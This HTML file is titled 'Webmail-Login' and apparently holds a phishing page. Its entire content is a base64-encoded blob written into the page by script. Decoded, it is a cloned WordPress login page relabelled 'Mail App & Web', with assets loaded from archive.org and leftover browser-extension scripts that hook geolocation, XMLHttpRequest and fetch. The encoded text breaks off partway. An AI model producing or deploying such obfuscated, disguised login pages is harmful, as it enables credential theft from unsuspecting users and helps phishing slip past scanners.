<!DOCTYPE html>
<html>
<head>

  
  
  <title>Webmail-Login</title>
</head>
<body>
<script>
  document.write(unescape(atob("PCFET0NUWVBFIGh0bWw+Cgo8IS0tIHNhdmVkIGZyb20gdXJsPSgwMDMwKWh0dHBzOi8vaWZiLW5sLm5sL3dwLWxvZ2luLnBocCAtLT4KCgo8aHRtbCBsYW5nPSJlbi1HQiI+PHNjcmlwdCBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy96eGN2Ym4ubWluLmpzLmRvd25sb2FkIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGFzeW5jPSIiPjwvc2NyaXB0PjxzY3JpcHQ+CiAgICB3aW5kb3dbU3ltYm9sLmZvcignTUFSSU9fUE9TVF9DTElFTlRfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nKV0gPSBuZXcgKGNsYXNzIFBvc3RDbGllbnQgewogICAgY29uc3RydWN0b3IobmFtZSwgZGVzdGluYXRpb24pIHsKICAgICAgICB0aGlzLm5hbWUgPSBuYW1lOwogICAgICAgIHRoaXMuZGVzdGluYXRpb24gPSBkZXN0aW5hdGlvbjsKICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVycyA9IHt9OwogICAgICAgIHRoaXMuYmdSZXF1ZXN0c0xpc3RlbmVycyA9IHt9OwogICAgICAgIHRoaXMuYmdFdmVudHNMaXN0ZW5lcnMgPSB7fTsKICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIChtZXNzYWdlKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBtZXNzYWdlLmRhdGE7CiAgICAgICAgICAgIGNvbnN0IGlzTm90Rm9yTWUgPSAhKGRhdGEuZGVzdGluYXRpb24gJiYgZGF0YS5kZXN0aW5hdGlvbiA9PT0gdGhpcy5uYW1lKTsKICAgICAgICAgICAgY29uc3QgaGFzTm90RXZlbnRQcm9wID0gIWRhdGEuZXZlbnQ7CiAgICAgICAgICAgIGlmIChpc05vdEZvck1lIHx8IGhhc05vdEV2ZW50UHJvcCkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChkYXRhLmV2ZW50ID09PSAnTUFSSU9fUE9TVF9TRVJWRVJfX0JHX1JFU1BPTlNFJykgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBkYXRhLmFyZ3M7CiAgICAgICAgICAgICAgICBpZiAodGhpcy5oYXNCZ1JlcXVlc3RMaXN0ZW5lcihyZXNwb25zZS5yZXF1ZXN0SWQpKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3Jlc3BvbnNlLnJlcXVlc3RJZF0ocmVzcG9uc2UucmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZGVsZXRlIHRoaXMuYmdSZXF1ZXN0c0xpc3RlbmVyc1tyZXNwb25zZS5yZXF1ZXN0SWRdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGRhdGEuZXZlbnQgPT09ICdNQVJJT19QT1NUX1NFUlZFUl9fQkdfRVZFTlQnKSB7CiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGRhdGEuYXJnczsKICAgICAgICAgICAgICAgIGlmICh0aGlzLmhhc0JnRXZlbnRMaXN0ZW5lcihyZXNwb25zZS5ldmVudCkpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmJnRXZlbnRzTGlzdGVuZXJzW2RhdGEuaWRdKHJlc3BvbnNlLnBheWxvYWQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAodGhpcy5oYXNTZXJ2ZXJMaXN0ZW5lcihkYXRhLmV2ZW50KSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVyc1tkYXRhLmV2ZW50XShkYXRhLmFyZ3MpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBldmVudCBub3QgaGFuZGxlZDogJHtkYXRhLmV2ZW50fWApOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9CiAgICBlbWl0VG9TZXJ2ZXIoZXZlbnQsIGFyZ3MpIHsKICAgICAgICBjb25zdCBpZCA9IHRoaXMuZ2VuZXJhdGVVSUlEKCk7CiAgICAgICAgY29uc3QgbWVzc2FnZSA9IHsKICAgICAgICAgICAgYXJncywKICAgICAgICAgICAgZGVzdGluYXRpb246IHRoaXMuZGVzdGluYXRpb24sCiAgICAgICAgICAgIGV2ZW50LAogICAgICAgICAgICBpZCwKICAgICAgICB9OwogICAgICAgIHdpbmRvdy5wb3N0TWVzc2FnZShtZXNzYWdlLCBsb2NhdGlvbi5vcmlnaW4pOwogICAgICAgIHJldHVybiBpZDsKICAgIH0KICAgIGVtaXRUb0JnKGJnRXZlbnROYW1lLCBhcmdzKSB7CiAgICAgICAgY29uc3QgcmVxdWVzdElkID0gdGhpcy5nZW5lcmF0ZVVJSUQoKTsKICAgICAgICBjb25zdCByZXF1ZXN0ID0geyBiZ0V2ZW50TmFtZSwgcmVxdWVzdElkLCBhcmdzIH07CiAgICAgICAgdGhpcy5lbWl0VG9TZXJ2ZXIoJ01BUklPX1BPU1RfU0VSVkVSX19CR19SRVFVRVNUJywgcmVxdWVzdCk7CiAgICAgICAgcmV0dXJuIHJlcXVlc3RJZDsKICAgIH0KICAgIGhhc1NlcnZlckxpc3RlbmVyKGV2ZW50KSB7CiAgICAgICAgcmV0dXJuICEhdGhpcy5zZXJ2ZXJMaXN0ZW5lcnNbZXZlbnRdOwogICAgfQogICAgaGFzQmdSZXF1ZXN0TGlzdGVuZXIocmVxdWVzdElkKSB7CiAgICAgICAgcmV0dXJuICEhdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3JlcXVlc3RJZF07CiAgICB9CiAgICBoYXNCZ0V2ZW50TGlzdGVuZXIoYmdFdmVudE5hbWUpIHsKICAgICAgICByZXR1cm4gISF0aGlzLmJnRXZlbnRzTGlzdGVuZXJzW2JnRXZlbnROYW1lXTsKICAgIH0KICAgIGZyb21TZXJ2ZXJFdmVudChldmVudCwgbGlzdGVuZXIpIHsKICAgICAgICB0aGlzLnNlcnZlckxpc3RlbmVyc1tldmVudF0gPSBsaXN0ZW5lcjsKICAgIH0KICAgIGZyb21CZ0V2ZW50KGJnRXZlbnROYW1lLCBsaXN0ZW5lcikgewogICAgICAgIHRoaXMuYmdFdmVudHNMaXN0ZW5lcnNbYmdFdmVudE5hbWVdID0gbGlzdGVuZXI7CiAgICB9CiAgICBmcm9tQmdSZXNwb25zZShyZXF1ZXN0SWQsIGxpc3RlbmVyKSB7CiAgICAgICAgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3JlcXVlc3RJZF0gPSBsaXN0ZW5lcjsKICAgIH0KICAgIGdlbmVyYXRlVUlJRCgpIHsKICAgICAgICByZXR1cm4gJ3h4eHh4eHh4LXh4eHgtNHh4eC15eHh4LXh4eHh4eHh4eHh4eCcucmVwbGFjZSgvW3h5XS9nLCBmdW5jdGlvbiAoYykgewogICAgICAgICAgICBjb25zdCByID0gTWF0aC5yYW5kb20oKSAqIDE2IHwgMCwgdiA9IGMgPT09ICd4JyA/IHIgOiAociAmIDB4MyB8IDB4OCk7CiAgICAgICAgICAgIHJldHVybiB2LnRvU3RyaW5nKDE2KTsKICAgICAgICB9KTsKICAgIH0KfSkoJ01BUklPX1BPU1RfQ0xJRU5UX2VwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uJywgJ01BUklPX1BPU1RfU0VSVkVSX2VwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uJyk8L3NjcmlwdD48c2NyaXB0PgogICAgY29uc3QgaGlkZU15TG9jYXRpb24gPSBuZXcgKGNsYXNzIEhpZGVNeUxvY2F0aW9uIHsKICAgIGNvbnN0cnVjdG9yKGNsaWVudEtleSkgewogICAgICAgIHRoaXMuY2xpZW50S2V5ID0gY2xpZW50S2V5OwogICAgICAgIHRoaXMud2F0Y2hJRHMgPSB7fTsKICAgICAgICB0aGlzLmNsaWVudCA9IHdpbmRvd1tTeW1ib2wuZm9yKGNsaWVudEtleSldOwogICAgICAgIGNvbnN0IGdldEN1cnJlbnRQb3NpdGlvbiA9IG5hdmlnYXRvci5nZW9sb2NhdGlvbi5nZXRDdXJyZW50UG9zaXRpb247CiAgICAgICAgY29uc3Qgd2F0Y2hQb3NpdGlvbiA9IG5hdmlnYXRvci5nZW9sb2NhdGlvbi53YXRjaFBvc2l0aW9uOwogICAgICAgIGNvbnN0IGNsZWFyV2F0Y2ggPSBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uY2xlYXJXYXRjaDsKICAgICAgICBjb25zdCBzZWxmID0gdGhpczsKICAgICAgICBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uZ2V0Q3VycmVudFBvc2l0aW9uID0gZnVuY3Rpb24gKHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucykgewogICAgICAgICAgICBzZWxmLmhhbmRsZShnZXRDdXJyZW50UG9zaXRpb24sICdHRVQnLCBzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnMpOwogICAgICAgIH07CiAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLndhdGNoUG9zaXRpb24gPSBmdW5jdGlvbiAoc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zKSB7CiAgICAgICAgICAgIHJldHVybiBzZWxmLmhhbmRsZSh3YXRjaFBvc2l0aW9uLCAnV0FUQ0gnLCBzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnMpOwogICAgICAgIH07CiAgICAgICAgbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmNsZWFyV2F0Y2ggPSBmdW5jdGlvbiAoZmFrZVdhdGNoSWQpIHsKICAgICAgICAgICAgaWYgKGZha2VXYXRjaElkID09PSAtMSkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNvbnN0IHJlYWxXYXRjaElkID0gc2VsZi53YXRjaElEc1tmYWtlV2F0Y2hJZF07CiAgICAgICAgICAgIGRlbGV0ZSBzZWxmLndhdGNoSURzW2Zha2VXYXRjaElkXTsKICAgICAgICAgICAgcmV0dXJuIGNsZWFyV2F0Y2guYXBwbHkodGhpcywgW3JlYWxXYXRjaElkXSk7CiAgICAgICAgfTsKICAgIH0KICAgIGhhbmRsZShnZXRDdXJyZW50UG9zaXRpb25PcldhdGNoUG9zaXRpb24sIHR5cGUsIHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucykgewogICAgICAgIGNvbnN0IHJlcXVlc3RJZCA9IHRoaXMuY2xpZW50LmVtaXRUb0JnKCdISURFX01ZX0xPQ0FUSU9OX19HRVRfTE9DQVRJT04nKTsKICAgICAgICBsZXQgZmFrZVdhdGNoSWQgPSB0aGlzLmdldFJhbmRvbUludCgwLCAxMDAwMDApOwogICAgICAgIHRoaXMuY2xpZW50LmZyb21CZ1Jlc3BvbnNlKHJlcXVlc3RJZCwgKHJlc3BvbnNlKSA9PiB7CiAgICAgICAgICAgIGlmIChyZXNwb25zZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uuc3RhdHVzID09PSAnU1VDQ0VTUycpIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwb3NpdGlvbiA9IHRoaXMubWFwKHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzQ2FsbGJhY2socG9zaXRpb24pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXJyb3IgPSB0aGlzLmVycm9yT2JqKCk7CiAgICAgICAgICAgICAgICAgICAgZXJyb3JDYWxsYmFjayhlcnJvcik7CiAgICAgICAgICAgICAgICAgICAgZmFrZVdhdGNoSWQgPSAtMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGNvbnN0IGFyZ3MgPSBbc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zXTsKICAgICAgICAgICAgICAgIGNvbnN0IHdhdGNoSWQgPSBnZXRDdXJyZW50UG9zaXRpb25PcldhdGNoUG9zaXRpb24uYXBwbHkobmF2aWdhdG9yLmdlb2xvY2F0aW9uLCBhcmdzKTsKICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSAnV0FUQ0gnKSB7CiAgICAgICAgICAgICAgICAgICAgdGhpcy53YXRjaElEc1tmYWtlV2F0Y2hJZF0gPSB3YXRjaElkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgaWYgKHR5cGUgPT09ICdXQVRDSCcpIHsKICAgICAgICAgICAgcmV0dXJuIGZha2VXYXRjaElkOwogICAgICAgIH0KICAgIH0KICAgIG1hcChyZXNwb25zZSkgewogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGNvb3JkczogewogICAgICAgICAgICAgICAgYWNjdXJhY3k6IDIwLAogICAgICAgICAgICAgICAgYWx0aXR1ZGU6IG51bGwsCiAgICAgICAgICAgICAgICBhbHRpdHVkZUFjY3VyYWN5OiBudWxsLAogICAgICAgICAgICAgICAgaGVhZGluZzogbnVsbCwKICAgICAgICAgICAgICAgIGxhdGl0dWRlOiByZXNwb25zZS5sYXRpdHVkZSwKICAgICAgICAgICAgICAgIGxvbmdpdHVkZTogcmVzcG9uc2UubG9uZ2l0dWRlLAogICAgICAgICAgICAgICAgc3BlZWQ6IG51bGwsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHRpbWVzdGFtcDogRGF0ZS5ub3coKSwKICAgICAgICB9OwogICAgfQogICAgZXJyb3JPYmooKSB7CiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgY29kZTogMSwKICAgICAgICAgICAgbWVzc2FnZTogJ1VzZXIgZGVuaWVkIEdlb2xvY2F0aW9uJywKICAgICAgICB9OwogICAgfQogICAgZ2V0UmFuZG9tSW50KG1pbiwgbWF4KSB7CiAgICAgICAgbWluID0gTWF0aC5jZWlsKG1pbik7CiAgICAgICAgbWF4ID0gTWF0aC5mbG9vcihtYXgpOwogICAgICAgIHJldHVybiBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAobWF4IC0gbWluICsgMSkpICsgbWluOwogICAgfQp9KSgnTUFSSU9fUE9TVF9DTElFTlRfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nKQogIDwvc2NyaXB0PjxoZWFkPjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KCQoJPHRpdGxlPk1haWwgQXBwICYgV2ViPC90aXRsZT4KCQoJPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBmb2xsb3ciPgo8bGluayByZWw9InN0eWxlc2hlZXQiIGlkPSJkYXNoaWNvbnMtY3NzIiBocmVmPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvZGFzaGljb25zLm1pbi5jc3MiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0iYWxsIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0iYnV0dG9ucy1jc3MiIGhyZWY9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9idXR0b25zLm1pbi5jc3MiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0iYWxsIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0iZm9ybXMtY3NzIiBocmVmPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvZm9ybXMubWluLmNzcyIgdHlwZT0idGV4dC9jc3MiIG1lZGlhPSJhbGwiPgo8bGluayByZWw9InN0eWxlc2hlZXQiIGlkPSJsMTBuLWNzcyIgaHJlZj0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2wxMG4ubWluLmNzcyIgdHlwZT0idGV4dC9jc3MiIG1lZGlhPSJhbGwiPgo8bGluayByZWw9InN0eWxlc2hlZXQiIGlkPSJsb2dpbi1jc3MiIGhyZWY9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9sb2dpbi5taW4uY3NzIiB0eXBlPSJ0ZXh0L2NzcyIgbWVkaWE9ImFsbCI+Cgk8bWV0YSBuYW1lPSJyZWZlcnJlciIgY29udGVudD0ic3RyaWN0LW9yaWdpbi13aGVuLWNyb3NzLW9yaWdpbiI+CgkJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCI+Cgk8bGluayByZWw9Imljb24iIGhyZWY9Imh0dHBzOi8vaWZiLW5sLm5sL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzAzL2Nyb3BwZWQtTmV3LVByb2plY3QtNDMtMzJ4MzIucG5nIiBzaXplcz0iMzJ4MzIiPgo8bGluayByZWw9Imljb24iIGhyZWY9Imh0dHBzOi8vaWZiLW5sLm5sL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzAzL2Nyb3BwZWQtTmV3LVByb2plY3QtNDMtMTkyeDE5Mi5wbmciIHNpemVzPSIxOTJ4MTkyIj4KPGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSJodHRwczovL2lmYi1ubC5ubC93cC1jb250ZW50L3VwbG9hZHMvMjAyMy8wMy9jcm9wcGVkLU5ldy1Qcm9qZWN0LTQzLTE4MHgxODAucG5nIj4KPG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vaWZiLW5sLm5sL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzAzL2Nyb3BwZWQtTmV3LVByb2plY3QtNDMtMjcweDI3MC5wbmciPgoJPHNjcmlwdCBlY29tbWVyY2UtdHlwZT0iZXh0ZW5kLW5hdGl2ZS1oaXN0b3J5LWFwaSI+KCgpID0+IHsKICAgICAgICAgICAgY29uc3QgbmF0aXZlUHVzaFN0YXRlID0gaGlzdG9yeS5wdXNoU3RhdGU7CiAgICAgICAgICAgIGNvbnN0IG5hdGl2ZVJlcGxhY2VTdGF0ZSA9IGhpc3RvcnkucmVwbGFjZVN0YXRlOwogICAgICAgICAgICBjb25zdCBuYXRpdmVCYWNrID0gaGlzdG9yeS5iYWNrOwogICAgICAgICAgICBjb25zdCBuYXRpdmVGb3J3YXJkID0gaGlzdG9yeS5mb3J3YXJkOwogICAgICAgICAgICBmdW5jdGlvbiBlbWl0VXJsQ2hhbmdlZCgpIHsKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICAgICAgICAgICAgICAgICAgX2N1c3RvbV90eXBlXzogJ0NVU1RPTV9PTl9VUkxfQ0hBTkdFRCcsCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgd2luZG93LnBvc3RNZXNzYWdlKG1lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGhpc3RvcnkucHVzaFN0YXRlID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgbmF0aXZlUHVzaFN0YXRlLmFwcGx5KGhpc3RvcnksIGFyZ3VtZW50cyk7CiAgICAgICAgICAgICAgICBlbWl0VXJsQ2hhbmdlZCgpOwogICAgICAgICAgICB9OwogICAgICAgICAgICBoaXN0b3J5LnJlcGxhY2VTdGF0ZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZVJlcGxhY2VTdGF0ZS5hcHBseShoaXN0b3J5LCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgZW1pdFVybENoYW5nZWQoKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgaGlzdG9yeS5iYWNrID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgbmF0aXZlQmFjay5hcHBseShoaXN0b3J5LCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgZW1pdFVybENoYW5nZWQoKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgaGlzdG9yeS5mb3J3YXJkID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgbmF0aXZlRm9yd2FyZC5hcHBseShoaXN0b3J5LCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgZW1pdFVybENoYW5nZWQoKTsKICAgICAgICAgICAgfTsKICAgICAgICB9KSgpPC9zY3JpcHQ+PHNjcmlwdD4oZnVuY3Rpb24gaW5qZWN0KGUpe2Z1bmN0aW9uIFNlbmRYSFJDYW5kaWRhdGUoZSx0LG4scixpKXt0cnl7dmFyIG89ImRldGVjdG9yIixzPXtwb3NkTWVzc2FnZUlkOiJQQU5FTE9TX01FU1NBR0UiLHBvc2RIYXNoOihNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHJpbmcoMiwxNSkrTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsMTUpK01hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnN1YnN0cmluZygyLDE1KSkuc3Vic3RyaW5nKDAsMjIpLHR5cGU6IlZJREVPX1hIUl9DQU5ESURBVEUiLGZyb206byx0bzpvLnN1YnN0cmluZygwLDYpLGNvbnRlbnQ6e3JlcXVlc3RNZXRob2Q6ZSx1cmw6dCx0eXBlOm4sY29udGVudDpyfX07aSYmaVswXSYmaVswXS5sZW5ndGgmJihzLmNvbnRlbnQuZW5jb2RlZFBvc3RCb2R5PWlbMF0pLHdpbmRvdy5wb3N0TWVzc2FnZShzLCIqIil9Y2F0Y2goZSl7fX12YXIgdD1YTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3BlbjtYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3Blbj1mdW5jdGlvbigpe3RoaXMucmVxdWVzdE1ldGhvZD1hcmd1bWVudHNbMF0sdC5hcHBseSh0aGlzLGFyZ3VtZW50cyl9O3ZhciBuPVhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZW5kO1hNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZW5kPWZ1bmN0aW9uKCl7dmFyIHQ9T2JqZWN0LmFzc2lnbihhcmd1bWVudHMse30pLHI9dGhpcy5vbnJlYWR5c3RhdGVjaGFuZ2U7cmV0dXJuIHRoaXMub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7aWYoNCE9PXRoaXMucmVhZHlTdGF0ZXx8ZnVuY3Rpb24gaXNGcmFtZUluQmxhY2tMaXN0KHQpe3JldHVybiBlLnNvbWUoKGZ1bmN0aW9uKGUpe3JldHVybiB0LmluY2x1ZGVzKGUpfSkpfSh0aGlzLnJlc3BvbnNlVVJMKXx8c2V0VGltZW91dChTZW5kWEhSQ2FuZGlkYXRlKHRoaXMucmVxdWVzdE1ldGhvZCx0aGlzLnJlc3BvbnNlVVJMLHRoaXMuZ2V0UmVzcG9uc2VIZWFkZXIoImNvbnRlbnQtdHlwZSIpLHRoaXMucmVzcG9uc2UsdCksMCkscilyZXR1cm4gci5hcHBseSh0aGlzLGFyZ3VtZW50cyl9LG4uYXBwbHkodGhpcyxhcmd1bWVudHMpfTt2YXIgcj1mZXRjaDtmZXRjaD1mdW5jdGlvbiBmZXRjaCgpe3ZhciBlPXRoaXMsdD1hcmd1bWVudHMsbj1hcmd1bWVudHNbMF1pbnN0YW5jZW9mIFJlcXVlc3Q/YXJndW1lbnRzWzBdLnVybDphcmd1bWVudHNbMF0saT1hcmd1bWVudHNbMF1pbnN0YW5jZW9mIFJlcXVlc3Q/YXJndW1lbnRzWzBdLm1ldGhvZDoiR0VUIjtyZXR1cm4gbmV3IFByb21pc2UoKGZ1bmN0aW9uKG8scyl7ci5hcHBseShlLHQpLnRoZW4oKGZ1bmN0aW9uKGUpe2lmKGUuYm9keSBpbnN0YW5jZW9mIFJlYWRhYmxlU3RyZWFtKXt2YXIgdD1lLmpzb247ZS5qc29uPWZ1bmN0aW9uKCl7dmFyIHI9YXJndW1lbnRzLG89dGhpcztyZXR1cm4gbmV3IFByb21pc2UoKGZ1bmN0aW9uKHMsYSl7dC5hcHBseShvLHIpLnRoZW4oKGZ1bmN0aW9uKHQpe3NldFRpbWVvdXQoU2VuZFhIUkNhbmRpZGF0ZShpLG4sZS5oZWFkZXJzLmdldCgiY29udGVudC10eXBlIiksSlNPTi5zdHJpbmdpZnkodCkpLDApLHModCl9KSkuY2F0Y2goKGZ1bmN0aW9uKGUpe2EoZSl9KSl9KSl9O3ZhciByPWUudGV4dDtlLnRleHQ9ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMsbz10aGlzO3JldHVybiBuZXcgUHJvbWlzZSgoZnVuY3Rpb24ocyxhKXtyLmFwcGx5KG8sdCkudGhlbigoZnVuY3Rpb24odCl7c2V0VGltZW91dChTZW5kWEhSQ2FuZGlkYXRlKGksbixlLmhlYWRlcnMuZ2V0KCJjb250ZW50LXR5cGUiKSx0KSwwKSxzKHQpfSkpLmNhdGNoKChmdW5jdGlvbihlKXthKGUpfSkpfSkpfX1vLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0pKS5jYXRjaCgoZnVuY3Rpb24oKXtzLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0pKX0pKX19KShbImZhY2Vib29rLmNvbS8iLCJ0d2l0dGVyLmNvbS8iLCJ5b3V0dWJlLW5vY29va2llLmNvbS9lbWJlZC8iLCIvL3ZrLmNvbS8iLCIvL3d3dy52ay5jb20vIiwiLy9saW5rZWRpbi5jb20vIiwiLy93d3cubGlua2VkaW4uY29tLyIsIi8vaW5zdGFncmFtLmNvbS8iLCIvL3d3dy5pbnN0YWdyYW0uY29tLyIsIi8vd3d3Lmdvb2dsZS5jb20vcmVjYXB0Y2hhL2FwaTIvIiwiLy9oYW5nb3V0cy5nb29nbGUuY29tL3dlYmNoYXQvIiwiLy93d3cuZ29vZ2xlLmNvbS9jYWxlbmRhci8iLCIvL3d3dy5nb29nbGUuY29tL21hcHMvZW1iZWQiLCJzcG90aWZ5LmNvbS8iLCJzb3VuZGNsb3VkLmNvbS8iLCIvL3BsYXllci52aW1lby5jb20vIiwiLy9kaXNxdXMuY29tLyIsIi8vdGd3aWRnZXQuY29tLyIsIi8vanMuZHJpZnR0LmNvbS8iLCJmcmllbmRzMmZvbGxvdy5jb20iLCIvd2lkZ2V0IiwibG9naW4iLCIvL3ZpZGVvLmJpZ21pci5uZXQvIiwiYmxvZ2dlci5jb20iLCIvL3NtYXJ0bG9jay5nb29nbGUuY29tLyIsIi8va2VlcC5nb29nbGUuY29tLyIsIi93ZWIudG9sc3RveWNvbW1lbnRzLmNvbS8iLCJtb3otZXh0ZW5zaW9uOi8vIiwiY2hyb21lLWV4dGVuc2lvbjovLyIsIi9hdXRoLyIsIi8vYW5hbHl0aWNzLmdvb2dsZS5jb20vIiwiYWRjbGFyaXR5LmNvbSIsInBhZGRsZS5jb20vY2hlY2tvdXQiLCJoY2FwdGNoYS5jb20iLCJyZWNhcHRjaGEubmV0IiwiMmNhcHRjaGEuY29tIiwiYWNjb3VudHMuZ29vZ2xlLmNvbSIsInd3dy5nb29nbGUuY29tL3Nob3BwaW5nL2N1c3RvbWVycmV2aWV3cyIsImJ1eS50aW55cGFzcy5jb20iLCJnc3RhdGljLmNvbSIsInNlY3VyZWlyLmViYXlzdGF0aWMuY29tIiwiZG9jcy5nb29nbGUuY29tIiwiY29udGFjdHMuZ29vZ2xlLmNvbSIsImdpdGh1Yi5jb20iLCJtYWlsLmdvb2dsZS5jb20iLCJjaGF0Lmdvb2dsZ